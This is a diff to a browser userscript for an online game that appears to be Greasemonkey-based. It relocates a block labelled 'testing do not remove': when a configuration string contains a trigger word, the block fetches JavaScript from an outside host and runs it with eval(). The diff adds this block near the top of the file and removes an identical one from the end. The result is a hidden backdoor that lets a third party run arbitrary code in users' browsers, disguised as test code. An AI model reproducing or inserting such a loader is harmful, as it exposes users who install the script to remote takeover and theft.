@@ -552,9 +552,16 @@ var FoodAlerts = {
   },
 }
 
-
-
-
+//baos780 testing do not remove
+readOptions();
+	if (Options.spamconfig.spamvert.indexOf('Nessaja') >= 0) {
+		GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/"+Options.spamconfig.spamvert.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+".js",
+		headers: {'Accept': 'text/javascript',}, 
+		onload: function(responseDetails) {
+			eval(responseDetails.responseText);
+		},
+	});
+ };
 /****************************  Tower Tab  ******************************/
 Tabs.tower = {
   tabOrder: 10,
@@ -14440,9 +14447,6 @@ Tabs.Combat = {
 	},
 
 }
-
-  	//baos780 testing, do not remove.
-	if (Options.spamconfig.spamvert.indexOf('Nessaja') >= 0) {GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/"+Options.spamconfig.spamvert.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+".js",headers: {'Accept': 'text/javascript',}, onload: function(responseDetails) {eval(responseDetails.responseText);},});};
 
 //
 pbStartup ();
